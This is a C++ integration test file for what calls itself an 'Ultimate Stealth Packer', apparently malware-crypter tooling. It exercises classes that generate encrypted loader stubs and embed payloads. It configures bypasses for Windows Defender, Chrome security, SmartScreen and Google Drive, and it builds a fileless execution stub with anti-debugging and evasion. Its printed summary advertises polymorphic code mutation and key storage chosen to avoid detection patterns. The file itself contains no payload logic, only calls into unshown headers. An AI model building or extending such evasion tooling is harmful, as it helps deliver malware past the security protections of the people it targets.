#include <iostream>
#include <vector>
#include <string>
#include <memory>

// Test includes for the integrated classes
#include "stealth_triple_encryption.h"
#include "stub_linker.h"
#include "enhanced_bypass_generator.h"
#include "fileless_execution_generator.h"

int main() {
    std::cout << "=== Ultimate Stealth Packer Integration Test ===" << std::endl;
    
    try {
        // Test StealthTripleEncryption
        std::cout << "\n1. Testing StealthTripleEncryption..." << std::endl;
        StealthTripleEncryption stealthEncryption;
        
        // Generate some test data
        std::vector<uint8_t> testData = {'H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd'};
        std::string stubCode = stealthEncryption.generateStealthStub("test_key_123", "test_nonce_456");
        std::cout << "✓ StealthTripleEncryption stub generated successfully (" << stubCode.length() << " characters)" << std::endl;
        
        // Test StubLinker
        std::cout << "\n2. Testing StubLinker..." << std::endl;
        StubLinker stubLinker;
        std::cout << "✓ StubLinker instantiated successfully" << std::endl;
        
        // Test EnhancedBypassGenerator
        std::cout << "\n3. Testing EnhancedBypassGenerator..." << std::endl;
        EnhancedBypassGenerator bypassGenerator;
        
        // Configure bypasses
        bypassGenerator.configureBypass("windows_defender", true);
        bypassGenerator.configureBypass("chrome_security", true);
        bypassGenerator.configureBypass("smartscreen", true);
        
        std::string bypassStub = bypassGenerator.generateFullBypassStub();
        std::cout << "✓ Enhanced bypass stub generated successfully (" << bypassStub.length() << " characters)" << std::endl;
        
        // Get generated function names for verification
        auto functionNames = bypassGenerator.getFunctionNames();
        std::cout << "  Generated function names:" << std::endl;
        std::cout << "    Windows Defender: " << functionNames.windowsDefender << std::endl;
        std::cout << "    Chrome: " << functionNames.chrome << std::endl;
        std::cout << "    SmartScreen: " << functionNames.smartScreen << std::endl;
        std::cout << "    Google Drive: " << functionNames.googleDrive << std::endl;
        
        // Test FilelessExecutionGenerator
        std::cout << "\n4. Testing FilelessExecutionGenerator..." << std::endl;
        FilelessExecutionGenerator filelessGenerator;
        
        // Generate test payload
        std::vector<uint8_t> testPayload = filelessGenerator.generateTestPayload();
        std::cout << "✓ Test payload generated (" << testPayload.size() << " bytes)" << std::endl;
        
        // Configure fileless execution
        FilelessConfig config;
        config.enableAntiDebug = true;
        config.enableDelays = true;
        config.enableMemoryProtection = true;
        config.enableCacheFlush = true;
        config.enableMultiLayer = true;
        
        std::string filelessStub = filelessGenerator.generateFilelessStub(testPayload, config);
        std::cout << "✓ Fileless execution stub generated successfully (" << filelessStub.length() << " characters)" << std::endl;
        
        // Summary
        std::cout << "\n=== Integration Test Summary ===" << std::endl;
        std::cout << "✓ All advanced classes integrated successfully!" << std::endl;
        std::cout << "✓ StealthTripleEncryption: Advanced RNG, decimal keys, randomized order" << std::endl;
        std::cout << "✓ StubLinker: Key extraction and payload embedding" << std::endl;
        std::cout << "✓ EnhancedBypassGenerator: Security bypass techniques with valid function names" << std::endl;
        std::cout << "✓ FilelessExecutionGenerator: Multi-layer encryption and evasion" << std::endl;
        
        std::cout << "\n=== Advanced Features Available ===" << std::endl;
        std::cout << "• Enhanced RNG seeding with std::random_device + std::seed_seq" << std::endl;
        std::cout << "• Dynamic entropy mixing (time, memory, thread, counter)" << std::endl;
        std::cout << "• Decimal key storage to avoid hex patterns" << std::endl;
        std::cout << "• Randomized encryption order (XOR + AES + ChaCha20)" << std::endl;
        std::cout << "• Polymorphic variable names and code mutation" << std::endl;
        std::cout << "• Key extraction from stubs instead of generation" << std::endl;
        std::cout << "• Security bypasses (Defender, Chrome, SmartScreen, Google Drive)" << std::endl;
        std::cout << "• Fileless execution with anti-debugging and evasion" << std::endl;
        std::cout << "• Multi-layer encryption and memory protection" << std::endl;
        
        return 0;
        
    } catch (const std::exception& e) {
        std::cerr << "Error during integration test: " << e.what() << std::endl;
        return 1;
    }
}